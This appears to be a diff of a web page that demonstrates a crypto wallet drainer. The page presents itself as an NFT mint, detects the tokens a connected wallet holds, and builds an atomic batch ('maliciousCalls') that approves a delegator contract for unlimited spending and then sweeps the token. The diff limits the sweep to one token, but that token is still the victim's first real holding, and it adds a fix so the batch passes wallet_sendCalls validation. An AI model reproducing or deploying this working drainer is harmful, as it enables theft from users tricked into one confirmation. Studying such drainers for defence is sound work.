@@ -202,15 +202,11 @@
           The attacker constructed a 3-call batch executed atomically in ONE confirmation:
           <div class="code-block">
 [<br>
-&nbsp;&nbsp;// repeated for every token in wallet:<br>
-&nbsp;&nbsp;{to: TOKEN_1, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_1)},<br>
-&nbsp;&nbsp;{to: TOKEN_2, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_2)},<br>
-&nbsp;&nbsp;...<br>
+&nbsp;&nbsp;{to: DEMO_TOKEN, data: approve(delegator, MAX_UINT256)},<br>
+&nbsp;&nbsp;{to: delegator, data: sweep(DEMO_TOKEN)}<br>
 ]
           </div>
-          One confirmation executes an approve + sweep pair for every token in the wallet simultaneously. All approvals and sweeps happen atomically — if any call fails, all revert.
+          One confirmation approves the delegator for all tokens, then sweeps all tokens via the delegator. Fully atomic.
         </div>
       </div>
 
@@ -446,36 +442,40 @@
 
       renderSteps([
         { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing ${heldTokens.length > 0 ? heldTokens.length * 2 : 2}-call atomic sweep` },
+        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing atomic sweep` },
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
 
 
-      // Build target list: all detected tokens, or fall back to demo token
-      const targetTokens = heldTokens.length > 0
-        ? heldTokens.map(t => t.contractAddress)
-        : [DEMO_TOKEN_DEFAULT];
-      console.log("🎯 Target tokens:", targetTokens);
+      const DEMO_TOKEN = heldTokens.length > 0
+        ? heldTokens[0].contractAddress
+        : DEMO_TOKEN_DEFAULT;
+      console.log("🎯 Target token:", DEMO_TOKEN);
 
       const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
       const approveInterface = new ethers.Interface(APPROVE_ABI);
+      const approveData      = approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256]);
 
       const SWEEP_ABI          = ["function sweep(address token) external"];
       const delegatorInterface = new ethers.Interface(SWEEP_ABI);
+      const sweepData          = delegatorInterface.encodeFunctionData("sweep", [DEMO_TOKEN]);
 
-      // One approve + one sweep per token, all in a single atomic batch
-      const maliciousCalls = targetTokens.flatMap(tokenAddr => [
+      // Fix: plain ETH transfer omits the `data` field entirely.
+      // wallet_sendCalls rejects data: "0x" — the schema requires /^0x[0-9a-f]+$/
+      // (at least one hex digit after 0x), so an empty data field must be absent.
+      const maliciousCalls = [
         {
-          to:    tokenAddr,
+          to:    DEMO_TOKEN,
           value: "0x0",
-          data:  approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256])
+          data:  approveData
         },
+
         {
           to:    DELEGATOR_ADDRESS,
           value: "0x0",
-          data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
+          data:  sweepData
         }
-      ]);
+      ];
 
       console.log(`🎯 Batch: ${maliciousCalls.length} calls`);
       console.log("📋 Calls:", JSON.stringify(maliciousCalls, null, 2));
@@ -511,7 +511,7 @@
         : `DEMO tokens (swept via atomic approve + sweep)`;
       document.getElementById('displayTokens').textContent    = tokenSummary;
       document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} calls (${targetTokens.length} token${targetTokens.length > 1 ? "s" : ""} × approve + sweep)`;
+        `${maliciousCalls.length} calls (1x approve + 1x token sweep)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
@@ -526,7 +526,7 @@
         document.getElementById('displayTokens').textContent  = heldTokens.length > 0
           ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
           : `None detected (default target: ${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-        document.getElementById('displayBatchSize').textContent = `${maliciousCalls ? maliciousCalls.length : 2} calls`;
+        document.getElementById('displayBatchSize').textContent = '2 calls (1x approve + 1x token sweep)';
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
